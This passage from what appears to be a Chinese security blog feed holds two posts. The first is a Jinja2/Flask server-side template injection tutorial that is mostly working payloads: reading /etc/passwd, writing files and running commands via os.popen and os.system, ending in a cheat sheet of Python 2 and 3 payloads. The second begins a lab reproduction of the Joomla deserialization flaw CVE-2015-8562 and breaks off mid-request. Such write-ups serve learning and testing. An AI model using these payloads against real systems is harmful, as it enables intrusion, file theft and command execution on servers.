&#39;plistlib._DumbXMLWriter&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistParser&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistWriter&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;tempfile._RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;pkg_resources.extern.VendorImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.appdirs.AppDirs&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.Infinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.NegativeInfinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.version._BaseVersion&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.specifiers.BaseSpecifier&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._Constants&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._ParseResultsWithOffset&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParseResults&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement._FifoCache&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._NullToken&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.OnlyOnce&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.pyparsing_common&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Node&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Marker&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.requirements.Requirement&#39;&gt;, &lt;class &#39;pkg_resources.IMetadataProvider&#39;&gt;, &lt;class &#39;pkg_resources.WorkingSet&#39;&gt;, &lt;class &#39;pkg_resources.Environment&#39;&gt;, &lt;class &#39;pkg_resources.ResourceManager&#39;&gt;, &lt;class &#39;pkg_resources.NullProvider&#39;&gt;, &lt;class &#39;pkg_resources.NoDists&#39;&gt;, &lt;class &#39;pkg_resources.EntryPoint&#39;&gt;, &lt;class &#39;pkg_resources.Distribution&#39;&gt;, &lt;class &#39;gunicorn.pidfile.Pidfile&#39;&gt;, &lt;class &#39;CArgObject&#39;&gt;, &lt;class &#39;_ctypes.CThunkObject&#39;&gt;, &lt;class &#39;_ctypes._CData&#39;&gt;, &lt;class &#39;_ctypes.CField&#39;&gt;, &lt;class &#39;_ctypes.DictRemover&#39;&gt;, &lt;class &#39;ctypes.CDLL&#39;&gt;, &lt;class &#39;ctypes.LibraryLoader&#39;&gt;, &lt;class &#39;gunicorn.sock.BaseSocket&#39;&gt;, &lt;class &#39;gunicorn.arbiter.Arbiter&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;argparse._AttributeHolder&#39;&gt;, &lt;class &#39;argparse.HelpFormatter._Section&#39;&gt;, &lt;class &#39;argparse.HelpFormatter&#39;&gt;, &lt;class &#39;argparse.FileType&#39;&gt;, &lt;class &#39;argparse._ActionsContainer&#39;&gt;, &lt;class &#39;shlex.shlex&#39;&gt;, &lt;class &#39;ipaddress._IPAddressBase&#39;&gt;, &lt;class &#39;ipaddress._BaseV4&#39;&gt;, &lt;class &#39;ipaddress._IPv4Constants&#39;&gt;, &lt;class &#39;ipaddress._BaseV6&#39;&gt;, &lt;class &#39;ipaddress._IPv6Constants&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;gunicorn.reloader.InotifyReloader&#39;&gt;, &lt;class &#39;gunicorn.config.Config&#39;&gt;, &lt;class &#39;gunicorn.config.Setting&#39;&gt;, &lt;class &#39;gunicorn.debug.Spew&#39;&gt;, &lt;class &#39;gunicorn.app.base.BaseApplication&#39;&gt;, &lt;class &#39;pickle._Framer&#39;&gt;, &lt;class &#39;pickle._Unframer&#39;&gt;, &lt;class &#39;pickle._Pickler&#39;&gt;, &lt;class &#39;pickle._Unpickler&#39;&gt;, &lt;class &#39;_pickle.Unpickler&#39;&gt;, &lt;class &#39;_pickle.Pickler&#39;&gt;, &lt;class &#39;_pickle.Pdata&#39;&gt;, &lt;class &#39;_pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;_pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;queue.Queue&#39;&gt;, &lt;class &#39;logging.handlers.QueueListener&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;logging.config.ConvertingMixin&#39;&gt;, &lt;class &#39;logging.config.BaseConfigurator&#39;&gt;, &lt;class &#39;gunicorn.glogging.Logger&#39;&gt;, &lt;class &#39;gunicorn.http.unreader.Unreader&#39;&gt;, &lt;class &#39;gunicorn.http.body.ChunkedReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.LengthReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.EOFReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.Body&#39;&gt;, &lt;class &#39;gunicorn.http.message.Message&#39;&gt;, &lt;class &#39;gunicorn.http.parser.Parser&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.Response&#39;&gt;, &lt;class &#39;gunicorn.workers.workertmp.WorkerTmp&#39;&gt;, &lt;class &#39;gunicorn.workers.base.Worker&#39;&gt;, &lt;class &#39;_json.Scanner&#39;&gt;, &lt;class &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextBase&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextIterator&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;concurrent.futures._base._Waiter&#39;&gt;, &lt;class &#39;concurrent.futures._base._AcquireFutures&#39;&gt;, &lt;class &#39;concurrent.futures._base.Future&#39;&gt;, &lt;class &#39;concurrent.futures._base.Executor&#39;&gt;, &lt;class &#39;multiprocessing.process.BaseProcess&#39;&gt;, &lt;class &#39;array.array&#39;&gt;, &lt;class &#39;multiprocessing.reduction._C&#39;&gt;, &lt;class &#39;multiprocessing.reduction.AbstractReducer&#39;&gt;, &lt;class &#39;multiprocessing.context.BaseContext&#39;&gt;, &lt;class &#39;_multiprocessing.SemLock&#39;&gt;, &lt;class &#39;multiprocessing.util.Finalize&#39;&gt;, &lt;class &#39;multiprocessing.util.ForkAwareThreadLock&#39;&gt;, &lt;class &#39;multiprocessing.connection._ConnectionBase&#39;&gt;, &lt;class &#39;multiprocessing.connection.Listener&#39;&gt;, &lt;class &#39;multiprocessing.connection.SocketListener&#39;&gt;, &lt;class &#39;multiprocessing.connection.ConnectionWrapper&#39;&gt;, &lt;class &#39;concurrent.futures.process._ExceptionWithTraceback&#39;&gt;, &lt;class &#39;concurrent.futures.process._WorkItem&#39;&gt;, &lt;class &#39;concurrent.futures.process._ResultItem&#39;&gt;, &lt;class &#39;concurrent.futures.process._CallItem&#39;&gt;, &lt;class &#39;concurrent.futures.thread._WorkItem&#39;&gt;, &lt;class &#39;asyncio.events.Handle&#39;&gt;, &lt;class &#39;asyncio.events.AbstractServer&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoop&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoopPolicy&#39;&gt;, &lt;class &#39;asyncio.coroutines.CoroWrapper&#39;&gt;, &lt;class &#39;asyncio.futures._TracebackLogger&#39;&gt;, &lt;class &#39;asyncio.futures.Future&#39;&gt;, &lt;class &#39;_asyncio.Future&#39;&gt;, &lt;class &#39;_asyncio.FutureIter&#39;&gt;, &lt;class &#39;TaskStepMethWrapper&#39;&gt;, &lt;class &#39;TaskWakeupMethWrapper&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManager&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManagerMixin&#39;&gt;, &lt;class &#39;asyncio.locks.Event&#39;&gt;, &lt;class &#39;asyncio.protocols.BaseProtocol&#39;&gt;, &lt;class &#39;asyncio.queues.Queue&#39;&gt;, &lt;class &#39;asyncio.streams.StreamWriter&#39;&gt;, &lt;class &#39;asyncio.streams.StreamReader&#39;&gt;, &lt;class &#39;asyncio.subprocess.Process&#39;&gt;, &lt;class &#39;asyncio.transports.BaseTransport&#39;&gt;, &lt;class &#39;asyncio.sslproto._SSLPipe&#39;&gt;, &lt;class &#39;asyncio.unix_events.AbstractChildWatcher&#39;&gt;, &lt;class &#39;jinja2.asyncsupport.AsyncLoopContextIterator&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug._internal._DictAccessorProperty&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;werkzeug.serving.WSGIRequestHandler&#39;&gt;, &lt;class &#39;werkzeug.serving._SSLContext&#39;&gt;, &lt;class &#39;werkzeug.serving.BaseWSGIServer&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.UpdateDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ViewItems&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_request.BaseRequest&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_response.BaseResponse&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;itsdangerous.url_safe.URLSafeSerializerMixin&#39;&gt;, &lt;class &#39;flask._compat._DeprecatedBool&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals._FakeSignal&#39;&gt;, &lt;class &#39;flask.helpers.locked_cached_property&#39;&gt;, &lt;class &#39;flask.helpers._PackageBoundObject&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json._JSONModule&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.JSONMixin&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;&quot;str=str.split(&quot;,&quot;)for i in str:    if &quot;catch_warnings&quot; in i:       # print(i)        print (str.index(i))</code></pre><p>运行脚本得到<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>在列表的166位置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217103947375.png" alt="image-20211217103947375"></p><p>所以这一步的payload为：</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166]&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217104135330.png" alt="image-20211217104135330"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>找到重载过的<strong>init</strong>类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217104732910.png" alt="image-20211217104732910"></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>查看其引用 <strong>builtins</strong></p><p>Python 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__']&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217105126261.png" alt="image-20211217105126261"></p><p>这里返回的是字典，里面有许多常用的函数,如果存在，直接调用即可</p><p>使用 keys 中的 file 以实现读取文件的功能：</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__'].['file']('F://GetFlag.txt').read()&#125;&#125;</code></pre><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__'].['file']('/etc/passwd').read()&#125;&#125;</code></pre><p>写文件</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__'].['file']('/etc/passwd').write()&#125;&#125;</code></pre><p>存在的子模块可以通过 .index() 来进行查询，如果存在的话返回索引，直接调用即可。（这里我还没有搞懂）</p><p>还有另外的方法：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code></pre><p>写文件换为 .write() 即可。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul><li>利用eval进行命令执行。</li></ul><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217111206867.png" alt="image-20211217111206867"></p><ul><li>利用warnings.catch_warnings 进行命令执行。</li></ul><p>首先，查看 warnings.catch_warnings 方法的位置：</p><pre><code class="python">[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</code></pre><p>查看 linecatch 的位置：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#39;linecache&#39;)</code></pre><p>查找 os 模块的位置：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)</code></pre><p>查找 system 方法的位置：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.keys().index(&#39;system&#39;)</code></pre><p>调用 system 方法：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</code></pre><ul><li>利用 commands 进行命令执行。</li></ul><pre><code class="python">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><h2 id="官方payload"><a href="#官方payload" class="headerlink" title="官方payload"></a>官方payload</h2><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("id").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h2 id="常用的ssti—payload"><a href="#常用的ssti—payload" class="headerlink" title="常用的ssti—payload"></a>常用的ssti—payload</h2><h2 id="python2："><a href="#python2：" class="headerlink" title="python2："></a>python2：</h2><pre><code class="python">#文件读取和写入&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()&#125;&#125;  &#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;  #每次执行都要先写然后编译执行&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')&#125;&#125;  &#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;  #命令执行&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']('1+1')&#125;&#125;  &#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').system('whoami')")&#125;&#125;#这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")&#125;&#125;#system函数换为popen(&#39;&#39;).read()，需要导入os模块&#123;&#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;#不需要导入os模块，直接从别的模块调用&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code></pre><h2 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h2><pre><code class="python">#读文件&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('d://whale.txt').read()&#125;&#125;#命令执行&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")&#125;&#125;#命令执行（变种）&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123;c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#读文件（变种）&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>joomla 反序列化漏洞(CVE-2015-8562)</title>
      <link href="/2021/12/13/joomla-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-8562/"/>
      <url>/2021/12/13/joomla-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-8562/</url>
      
        <content type="html"><![CDATA[<h1 id="joomla-反序列化漏洞-CVE-2015-8562"><a href="#joomla-反序列化漏洞-CVE-2015-8562" class="headerlink" title="joomla 反序列化漏洞(CVE-2015-8562)"></a>joomla 反序列化漏洞(CVE-2015-8562)</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><ul><li>Joomla 1.5.x, 2.x, and 3.x before 3.4.6</li><li>PHP 5.6 &lt; 5.6.13, PHP 5.5 &lt; 5.5.29 and PHP 5.4 &lt; 5.4.45</li></ul><h2 id="3-复现过程"><a href="#3-复现过程" class="headerlink" title="3.复现过程"></a>3.复现过程</h2><p>这里使用vulhub搭建环境</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213140734457.png" alt="image-20211213140734457"></p><p>环境启动后访问<code>http://your-ip:8080/</code>，按照指示安装即可</p><p>连接数据库：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213141146828.png" alt="image-20211213141146828"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213141233555.png" alt="image-20211213141233555"></p><p>安装完成后，访问主页，抓个包</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213141515900.png" alt="image-20211213141515900"></p><p>先把UA头和Cookie删除，构造数据包，让服务器返回Cookie</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213142010321.png" alt="image-20211213142010321"></p><p>发起请求：</p><pre><code>GET / HTTP/1.1Host: ip:8080Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://192.168.10.128:8080/installation/index.phpDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: 